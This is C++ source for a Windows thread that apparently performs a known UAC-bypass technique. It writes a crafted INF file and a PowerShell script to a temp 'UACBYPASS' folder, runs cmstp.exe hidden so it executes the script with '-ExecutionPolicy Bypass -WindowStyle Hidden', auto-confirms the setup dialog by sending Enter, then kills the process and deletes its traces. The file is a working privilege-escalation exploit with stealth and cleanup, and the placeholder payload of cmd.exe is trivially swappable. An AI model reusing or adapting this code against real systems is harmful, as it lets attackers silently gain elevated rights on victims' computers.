#include <Windows.h>
#include <string>
#include <vector>
#include <shellapi.h>
#include <cwchar>
#include <fstream>
#include <filesystem>
#include <fileapi.h>
#include <tlhelp32.h>
#include <shlobj.h> 
#include <iostream>

#include <ExampleThread.h>

#pragma comment(lib, "shell32.lib")

namespace Configuration {

    struct Data {
    private:
        const std::string powerShellCommand = (R"INF(
                Start-Process cmd.exe
        )INF");

        const std::string cmstpPath = { "c:\\windows\\system32\\cmstp.exe" };
        const std::string powerShellScript = { "updater.ps1" };

        std::filesystem::path _tmpPath = std::filesystem::temp_directory_path() / "UACBYPASS";
        std::filesystem::path infFilePath = _tmpPath / ("config.inf");
        std::filesystem::path psFilePath = _tmpPath / (powerShellScript);


        const std::string leftSite = (R"INF([Version]
Signature="$Chicago$"
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
)INF");

        const std::string rightSite = (R"INF(
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUser_LDIDSection,7

[AllUser_LDIDSection]
"HKLM","SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE","ProfileInstallPath",,""

[DefaultUninstall]
CustomDestination=CustInstDestSectionAllUsers

[Strings]
ServiceName="Example"
ShortSvcName="Example"
)INF");




        void RemoveDesktopShortcut(const std::string& shortcutName) {
            char desktopPath[MAX_PATH];
            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath))) {
                std::string shortcutPath = std::string(desktopPath) + "\\" + shortcutName;
                if (std::filesystem::exists(shortcutPath)) {
                    std::filesystem::remove(shortcutPath);
                }
            }
        }

    public:
        void Cleanup() {
            try {
                if (std::filesystem::exists(infFilePath)) std::filesystem::remove(infFilePath);
                if (std::filesystem::exists(psFilePath)) std::filesystem::remove(psFilePath);
                if (std::filesystem::exists(_tmpPath)) std::filesystem::remove_all(_tmpPath);
            }
            catch (...) {}
        }

        std::string GetCommand() const { return this->powerShellCommand; }

        std::string GetInfoFile() const {
            std::string path = psFilePath.string();
            if (path.find(' ') != std::string::npos) {
                path = "\"" + path + "\"";
            }
            return leftSite + "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " + path + "\n" + rightSite;
        }

        std::string GetBinaryPath() const { return this->cmstpPath; }
        std::filesystem::path GetPowerShellScriptPath() const { return this->psFilePath; }
        std::filesystem::path GetInfoFilePath() const { return this->infFilePath; }

        void SaveFile() {
            if (!std::filesystem::exists(_tmpPath)) {
                std::filesystem::create_directories(_tmpPath);
            }

            std::ofstream psFile(psFilePath);
            psFile << this->GetCommand();
            psFile.close();

            std::ofstream infFile(infFilePath);
            infFile << this->GetInfoFile();
            infFile.close();
        }

        void RemoveShortcut() {
            RemoveDesktopShortcut("Example.lnk");
            RemoveDesktopShortcut("Example.cmstp");
            RemoveDesktopShortcut("Connection Manager.lnk");
        }
    };
}

DWORD WINAPI ExampleThread(LPVOID) {

    auto data = Configuration::Data();
    data.SaveFile();
    
    auto KillProcessByName = [](const std::string& processName) {
        std::wstring wProcessName(processName.begin(), processName.end());
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return;

        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(PROCESSENTRY32W);

        if (Process32FirstW(hSnapshot, &pe)) {
            do {
                if (wProcessName == pe.szExeFile) {
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (hProcess) {
                        TerminateProcess(hProcess, 0);
                        CloseHandle(hProcess);
                    }
                }
            } while (Process32NextW(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
        };

    auto inf_file = data.GetInfoFilePath().string();

    std::string arguments = "/au \"" + inf_file + "\"";

    if (GetFileAttributesA(inf_file.c_str()) == INVALID_FILE_ATTRIBUTES) {
        return 1;
    }

    HINSTANCE result = ShellExecuteA(NULL, "open", data.GetBinaryPath().c_str(), arguments.c_str(), NULL, SW_HIDE);
    if ((INT_PTR)result <= 32) {
        return 1;
    }


    Sleep(1000);

    HWND window = NULL;
    for (int i = 0; i < 5 && window == NULL; i++) {
        window = FindWindowA("#32770", "Example");
        if (!window) {
            window = FindWindowA("#32770", "Connection Manager Setup");
        }
        if (!window) {
            Sleep(500);
        }
    }

    if (window) {
        PostMessage(window, WM_KEYDOWN, VK_RETURN, 0);
        PostMessage(window, WM_KEYUP, VK_RETURN, 0);
    }


    Sleep(2000);
    KillProcessByName("cmstp.exe");

    data.RemoveShortcut();

    std::string removearg = "/s /u \"" + inf_file + "\"";
    HINSTANCE removeresult = ShellExecuteA(NULL, "open", data.GetBinaryPath().c_str(), removearg.c_str(), NULL, SW_HIDE);

    data.Cleanup();

    return 0;
}

